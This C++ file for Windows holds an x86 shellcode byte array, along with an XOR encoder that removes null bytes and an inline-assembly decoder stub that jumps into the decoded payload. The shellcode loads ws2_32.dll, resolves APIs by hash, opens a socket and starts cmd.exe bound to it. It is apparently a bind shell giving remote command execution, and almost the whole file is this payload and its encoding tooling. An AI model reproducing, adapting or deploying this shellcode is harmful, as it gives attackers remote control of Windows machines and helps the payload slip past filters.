#include <iostream>
#include <Windows.h>


char shellcode[] = "\x55\x60\x81\xED\x00\x10\x00\x00\x81\xEC\x00\x10\x00\x00\x8B\xEC\x81\xEC\x00\x05\x00\x00\xC7\x45\xF4\x6C\x6C\x00\x00\xC7\x45\xF0\x33\x32\x2E\x64\xC7\x45\xEC\x77\x73\x32\x5F\xC7\x45\xE8\x65\x78\x65\x00\xC7\x45\xE4\x63\x6D\x64\x2E\xE8\x16\x02\x00\x00\x89\x45\xFC\x68\x87\x32\xD8\xC0\xFF\x75\xFC\xE8\x57\x01\x00\x00\x89\x45\xF8\x6A\x08\x6A\x00\x8D\x75\xEC\x56\xFF\x55\xF8\x89\x45\xE0\x68\x3D\x6A\xB4\x80\xFF\x75\xE0\xE8\x39\x01\x00\x00\x8D\xB5\x00\xFB\xFF\xFF\x56\x68\x02\x02\x00\x00\xFF\xD0\x68\x2D\x32\x78\xDE\xFF\x75\xE0\xE8\x1E\x01\x00\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x06\x6A\x01\x6A\x02\xFF\xD0\x89\x45\xDC\x66\xC7\x45\xCC\x02\x00\x66\xC7\x45\xCE\x22\xB8\xC7\x45\xD0\x00\x00\x00\x00\x68\x64\x10\xA7\xDD\xFF\x75\xE0\xE8\xED\x00\x00\x00\x6A\x10\x8D\x75\xCC\x56\xFF\x75\xDC\xFF\xD0\x68\x0C\x9F\xD3\x4B\xFF\x75\xE0\xE8\xD5\x00\x00\x00\x6A\x10\xFF\x75\xDC\xFF\xD0\x68\xB1\x1E\x97\x01\xFF\x75\xE0\xE8\xC1\x00\x00\x00\x89\x45\xC8\x68\xC9\xBC\xA6\x6B\xFF\x75\xFC\xE8\xB1\x00\x00\x00\x89\x45\xC4\x68\x57\x66\x0D\xFF\xFF\x75\xFC\xE8\xA1\x00\x00\x00\x89\x45\xBC\x6A\x00\x6A\x00\xFF\x75\xDC\xFF\x55\xC8\x89\x45\xC0\x8D\xBD\x00\xFF\xFF\xFF\x33\xC0\xB9\x04\x00\x00\x00\xFC\xF3\xAB\x8D\xBD\x70\xFE\xFF\xFF\x33\xC0\xB9\x11\x00\x00\x00\xFC\xF3\xAB\xC7\x85\x70\xFE\xFF\xFF\x44\x00\x00\x00\xC7\x85\x9C\xFE\xFF\xFF\x00\x01\x00\x00\x66\xC7\x85\xA0\xFE\xFF\xFF\x00\x00\x8B\x75\xC0\x89\xB5\xA8\xFE\xFF\xFF\x89\xB5\xAC\xFE\xFF\xFF\x89\xB5\xB0\xFE\xFF\xFF\x8D\xBD\x00\xFF\xFF\xFF\x57\x8D\xBD\x70\xFE\xFF\xFF\x57\x6A\x00\x6A\x00\x6A\x00\x6A\x01\x6A\x00\x6A\x00\x8D\x7D\xE4\x57\x6A\x00\xFF\x55\xC4\xFF\xB5\x00\xFF\xFF\xFF\xFF\x55\xBC\xFF\xB5\x04\xFF\xFF\xFF\xFF\x55\xBC\xE9\x67\xFF\xFF\xFF\x8B\xE5\x61\x5D\xC3\x55\x8B\xEC\x83\xEC\x1C\x53\x51\x52\x56\x8B\x55\x08\x8B\x72\x3C\x8D\x34\x16\x8B\x76\x78\x8D\x34\x16\x8B\x7E\x1C\x8D\x3C\x17\x89\x7D\xFC\x8B\x7E\x20\x8D\x3C\x17\x89\x7D\xF8\x8B\x7E\x24\x8D\x3C\x17\x89\x7D\xF4\x33\xC9\x8B\x75\xF8\x8B\x34\x8E\x8D\x34\x32\x56\xE8\x24\x00\x00\x00\x3B\x45\x0C\x74\x03\x41\xEB\xE9\x8B\x75\xF4\x33\xFF\x66\x8B\x3C\x4E\x8B\x5D\xFC\x8B\x34\xBB\x8D\x04\x16\x5E\x5A\x59\x5B\x8B\xE5\x5D\xC2\x08\x00\x55\x8B\xEC\x83\xEC\x04\xC7\x45\xFC\x00\x00\x00\x00\x53\x51\x52\x56\x8B\x75\x08\x33\xC9\x33\xD2\x33\xDB\x33\xC0\x8A\x04\x0E\x84\xC0\x74\x16\x8B\x5D\xFC\x8B\x55\xFC\xC1\xE2\x19\xC1\xEB\x07\x0B\xD3\x03\xD0\x41\x89\x55\xFC\xEB\xE1\x5E\x5A\x59\x5B\x8B\x45\xFC\x8B\xE5\x5D\xC2\x04\x00\x55\x8B\xEC\x83\xEC\x04\x53\x51\x52\x56\x64\x8B\x35\x30\x00\x00\x00\x8B\x76\x0C\x8B\x76\x1C\x8B\x36\x8B\x5E\x20\x53\xE8\x16\x00\x00\x00\x3D\xB2\x1A\x87\x84\x74\x02\xEB\xEC\x8B\x46\x08\x5E\x5A\x59\x5B\x8B\xE5\x5D\xC2\x04\x00\x55\x8B\xEC\x51\x36\xC7\x45\xFC\x00\x00\x00\x00\x36\x8B\x45\x08\x3E\x0F\xB7\x08\x85\xC9\x74\x31\x36\x8B\x55\xFC\xC1\xE2\x19\x36\x8B\x45\xFC\xC1\xE8\x07\x0B\xD0\x36\x89\x55\xFC\x36\x8B\x4D\x08\x3E\x0F\xB7\x11\x36\x03\x55\xFC\x36\x89\x55\xFC\x36\x8B\x45\x08\x83\xC0\x02\x36\x89\x45\x08\xEB\xC3\x36\x8B\x45\xFC\x8B\xE5\x5D\xC2\x04\x00";






#define shellcodeLength 0x2E0
 

void geneNoZeroShellcode()
{
	int nkey = 0;
	BOOL ifSuccess = TRUE;
	unsigned char* buff = new unsigned char[shellcodeLength];

	for (size_t key = 0; key < 0xff; key++)
	{
		ifSuccess = TRUE;
		nkey = key;
		for (size_t i = 0; i < shellcodeLength; i++)
		{
			buff[i] = shellcode[i] ^ key;
			if (buff[i] == 0)
			{
				ifSuccess = FALSE;
				break;
			}
		}
		if (ifSuccess)
		{
			break;
		}
	}
	printf("nkey=========0x%0.2X\n", nkey);
	printf("\n");
	// save
	FILE* fp;
	fopen_s(&fp, "encode.txt", "w+");
	fprintf(fp, "nkey=========0x%0.2X\n", nkey);
	fprintf(fp, "\\\n\"");
	for (size_t i = 0; i < shellcodeLength; i++)
	{
		fprintf(fp, "\\0x%0.2X", buff[i]);
		if ((i + 1) % 12 == 0)
		{
			fprintf(fp, "\"\\\n\"");

		}

	}
	fprintf(fp, "\"");
	fclose(fp);

	delete[] buff;
}

int mainE333()
{
	//__asm
	//{
	//	lea eax,shellcode
	//	push eax
	//	retn
	//}
	return 0;
	geneNoZeroShellcode();
	//return 0;

	printf("helloworld\n");
	__asm
	{
			xor eax,eax
			call tag_get_eip-1
		tag_get_eip:
			retn
			pop eax // eax==tag_get_eip
			xor ecx,ecx
			lea esi,[eax+0x1B] // ด๓ะก 1B * 2มห 
			mov cx, 0x2FB  // 0x2E0 + 1B
		tag_decode:
			mov al,[esi+ecx]
			xor al,0x09 // key
			mov [esi+ecx],al
			loop tag_decode
			xor [esi+ecx],0x09

			jmp esi
	}

	// \x33\xC0\xE8\xFF\xFF\xFF\xFF
	// \xC3\x58\x33\xC9\x8D\x70 \x1B \x66\xB9\xD7\x02\x8A\x04\x0E\x34\x09\x88\x04\x0E\xE2\xF6\x80\x34\x0E\x09\xFF\xE6

	//33 C0 E8 FF FF FF FF C3 58 33 C9 8D 70 1B 66 B9
	//	D7 02 8A 04 0E 34 09 88 04 0E E2 F6 80 34 0E 09
	//	FF E6

	return 0;
}